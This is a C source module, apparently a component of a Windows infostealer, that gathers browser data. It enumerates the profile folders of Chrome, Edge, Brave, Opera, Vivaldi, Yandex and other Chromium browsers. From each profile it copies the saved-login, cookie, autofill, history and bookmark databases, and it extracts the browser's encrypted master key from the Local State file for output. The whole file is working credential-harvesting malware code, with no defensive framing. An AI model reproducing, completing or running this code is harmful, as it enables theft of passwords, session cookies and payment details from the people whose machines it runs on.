// chunk: collectors/browser_chromium
// depends: core/emit_buffer, core/file_ops
// provides: collect_browsers, CHROMIUM_BROWSERS, N_BROWSERS, browser_def
// headers: shlobj.h

#ifndef CHUNK_BROWSER_CHROMIUM
#define CHUNK_BROWSER_CHROMIUM

#include <shlobj.h>

typedef struct {
    const char *name;
    const char *subpath;
} browser_def;

static const browser_def CHROMIUM_BROWSERS[] = {
    {"Chrome",       "Google\\Chrome\\User Data"},
    {"Edge",         "Microsoft\\Edge\\User Data"},
    {"Brave",        "BraveSoftware\\Brave-Browser\\User Data"},
    {"Opera",        "Opera Software\\Opera Stable"},
    {"OperaGX",      "Opera Software\\Opera GX Stable"},
    {"Vivaldi",      "Vivaldi\\User Data"},
    {"Chromium",     "Chromium\\User Data"},
    {"Yandex",       "Yandex\\YandexBrowser\\User Data"},
};
#define N_BROWSERS (sizeof(CHROMIUM_BROWSERS) / sizeof(CHROMIUM_BROWSERS[0]))

static void harvest_chromium_profile(const char *browser_name, const char *base, const char *profile) {
    char login[MAX_PATH], cookies[MAX_PATH], history[MAX_PATH], bookmarks[MAX_PATH], webdata[MAX_PATH];
    snprintf(login,     MAX_PATH, "%s\\%s\\Login Data",  base, profile);
    snprintf(cookies,   MAX_PATH, "%s\\%s\\Cookies",     base, profile);
    snprintf(history,   MAX_PATH, "%s\\%s\\History",     base, profile);
    snprintf(bookmarks, MAX_PATH, "%s\\%s\\Bookmarks",   base, profile);
    snprintf(webdata,   MAX_PATH, "%s\\%s\\Web Data",    base, profile);

    int found = 0;
    if (file_exists(login))     { grab_file(login,     "LoginData",  5*1024*1024); found++; }
    if (file_exists(cookies))   { grab_file(cookies,   "Cookies",    5*1024*1024); found++; }
    if (file_exists(webdata))   { grab_file(webdata,   "WebData",    5*1024*1024); found++; }
    if (file_exists(history))   { grab_file(history,   "History",    5*1024*1024); found++; }
    if (file_exists(bookmarks)) { grab_file(bookmarks, "Bookmarks",  2*1024*1024); found++; }

    if (found) emitf("  %s/%s: %d files\r\n", browser_name, profile, found);
}

static void collect_browsers(void) {
    emitf("=== BROWSER DATA ===\r\n");

    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char base[MAX_PATH];
        snprintf(base, MAX_PATH, "%s\\%s", local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(base)) continue;

        emitf("[%s]\r\n", CHROMIUM_BROWSERS[b].name);

        char ls_path[MAX_PATH];
        snprintf(ls_path, MAX_PATH, "%s\\Local State", base);
        if (file_exists(ls_path)) {
            char tmp_ls[MAX_PATH], temp[MAX_PATH];
            GetTempPathA(MAX_PATH, temp);
            snprintf(tmp_ls, MAX_PATH, "%s\\~ls%lx.tmp", temp, GetTickCount());
            if (CopyFileA(ls_path, tmp_ls, FALSE)) {
                HANDLE h = CreateFileA(tmp_ls, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, 0, NULL);
                if (h != INVALID_HANDLE_VALUE) {
                    DWORD sz = GetFileSize(h, NULL);
                    if (sz > 0 && sz < 2*1024*1024) {
                        char *d = (char *)malloc(sz + 1);
                        if (d) {
                            DWORD rd; ReadFile(h, d, sz, &rd, NULL); d[rd] = '\0';
                            char *ek = strstr(d, "encrypted_key");
                            if (ek) {
                                char *q1 = strchr(ek + 15, '"');
                                if (q1) {
                                    char *q2 = strchr(q1 + 1, '"');
                                    if (q2) {
                                        int kl = (int)(q2 - q1 - 1);
                                        emitf("  master_key[%d]: %.*s\r\n", kl, kl > 300 ? 300 : kl, q1+1);
                                    }
                                }
                            }
                            free(d);
                        }
                    }
                    CloseHandle(h);
                }
                DeleteFileA(tmp_ls);
            }
        }

        harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, "Default");
        char prof_dir[MAX_PATH];
        for (int p = 1; p <= 10; p++) {
            char pname[32];
            snprintf(pname, sizeof(pname), "Profile %d", p);
            snprintf(prof_dir, MAX_PATH, "%s\\%s", base, pname);
            if (file_exists(prof_dir))
                harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, pname);
        }
    }
    emitf("\r\n");
}

#endif
